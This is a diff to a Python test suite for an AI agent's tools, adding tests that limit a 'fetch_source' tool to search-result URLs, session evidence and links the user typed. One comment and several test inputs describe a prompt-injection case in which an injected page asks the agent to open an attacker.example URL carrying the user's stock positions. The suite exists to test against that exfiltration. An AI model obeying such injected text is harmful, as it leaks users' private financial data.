@@ -687,6 +687,7 @@ async def test_web_search_wrapped(world):
 
 
 async def test_fetch_source(world):
+    world.sessions.append(world.session_id, "user", "What does https://example.com/nvda say?")
     out = await world.run("fetch_source", {"url": "https://example.com/nvda"})
     assert not out.is_error and "<untrusted" in out.text and "Visible page text" in out.text
     assert INJECTION not in out.text
@@ -779,6 +780,8 @@ async def test_grounded_error_is_error(world):
     ],
 )
 async def test_every_external_text_tool_wraps_untrusted(world, name, args):
+    if name == "fetch_source":  # a link the user gave (final review C-I2)
+        world.sessions.append(world.session_id, "user", f"Read {args['url']}")
     out = await world.run(name, args)
     assert not out.is_error, out.text
     assert "<untrusted" in out.text
@@ -1801,3 +1804,52 @@ async def test_replaced_keys_are_still_scrubbed_from_broker_messages(world):
     out = await world.run("get_account", toolbox=tb)
     assert out.is_error and old_key not in out.text and FAKE_SECRET not in out.text
     assert "short" in out.text  # under the 8-character floor: never blanked
+
+
+# --- final review C-I2: fetch_source opens only search results and links the user gave -----------
+
+REFUSED_FETCH = "I can only open pages from search results or links you gave me"
+
+
+async def test_fetch_source_refuses_a_url_that_only_untrusted_text_mentions(world):
+    # An injected page asks for https://attacker.example/?d=<positions>: an egress channel.
+    world.sessions.append(world.session_id, "user", "Find news about chip demand")
+    await world.run("web_search", {"query": "chip demand"})
+    for url in ("https://attacker.example/?d=AAPL:40", "https://www.reuters.com/tech/chips?d=1",
+                "https://www.reuters.com/tech/chips/", "http://www.reuters.com/tech/chips"):
+        out = await world.run("fetch_source", {"url": url})
+        assert out.is_error and REFUSED_FETCH in out.text, url
+    assert not [c for c in world.web_http.calls if c[1] == "https://api.tavily.com/extract"]
+
+
+async def test_fetch_source_opens_a_search_result_url(world):
+    found = await world.run("web_search", {"query": "chip demand"})
+    assert "url: https://www.reuters.com/tech/chips" in found.text
+    out = await world.run("fetch_source", {"url": found.sources[0].url})
+    assert not out.is_error and "Visible page text" in out.text
+
+
+async def test_fetch_source_opens_any_evidence_url_of_the_session(world):
+    filings = await world.run("sec_filings", {"ticker_or_cik": "AAPL"})
+    out = await world.run("fetch_source", {"url": filings.sources[0].url})
+    assert not out.is_error
+
+
+async def test_fetch_source_opens_a_link_the_user_gave_but_not_one_from_another_session(world):
+    world.sessions.append(world.session_id, "user", "Summarise https://research.example.com/note, please.")
+    out = await world.run("fetch_source", {"url": "https://research.example.com/note"})
+    assert not out.is_error
+    other = world.sessions.create()["id"]
+    refused = await world.run("fetch_source", {"url": "https://research.example.com/note"}, session_id=other)
+    assert refused.is_error and REFUSED_FETCH in refused.text
+
+
+async def test_an_assistant_message_does_not_allow_a_url(world):
+    world.sessions.append(world.session_id, "assistant", "You could read https://attacker.example/x")
+    out = await world.run("fetch_source", {"url": "https://attacker.example/x"})
+    assert out.is_error and REFUSED_FETCH in out.text
+
+
+def test_the_fetch_source_description_says_where_urls_may_come_from():
+    spec = next(s for s in World().tb.specs() if s.name == "fetch_source")
+    assert "search result" in spec.description and "the user wrote" in spec.description
